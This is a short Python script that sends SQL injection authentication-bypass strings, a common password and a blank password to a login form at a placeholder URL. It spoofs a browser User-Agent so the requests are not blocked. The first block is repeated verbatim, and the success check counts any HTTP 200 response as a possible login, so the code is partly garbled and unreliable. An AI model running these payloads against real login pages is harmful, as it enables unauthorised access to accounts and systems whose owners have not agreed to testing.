import requests

# Target login URL
login_url = 'https://example.com/login'

# List of test payloads including SQL injection attempts and blank passwords
payloads = [
    {"username": "admin", "password": "' OR '1'='1"},
    {"username": "admin", "password": "' OR '1'='1' -- "},
    {"username": "admin", "password": "password123"},
    {"username": "admin", "password": ""},
    {"username": "' OR 1=1 --", "password": "anything"},
]

# Headers simulating a browser to prevent blocking
import requests

# Target login URL
login_url = 'https://example.com/login'

# List of test payloads including SQL injection attempts and blank passwords
payloads = [
    {"username": "admin", "password": "' OR '1'='1"},
    {"username": "admin", "password": "' OR '1'='1' -- "},
    {"username": "admin", "password": "password123"},
    {"username": "admin", "password": ""},
    {"username": "' OR 1=1 --", "password": "anything"},
]

# Headers simulating a browser to prevent blocking
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
}

def test_login(payload):
    response = requests.post(login_url, data=payload, headers=headers)
    # Customize success detection based on response content or status code
    if "Welcome" in response.text or response.status_code == 200:
        print(f"[+] Possible successful login with payload: {payload}")
    else:
        print(f"[-] Failed login with payload: {payload}")

if __name__ == "__main__":
    for p in payloads:
        test_login(p)
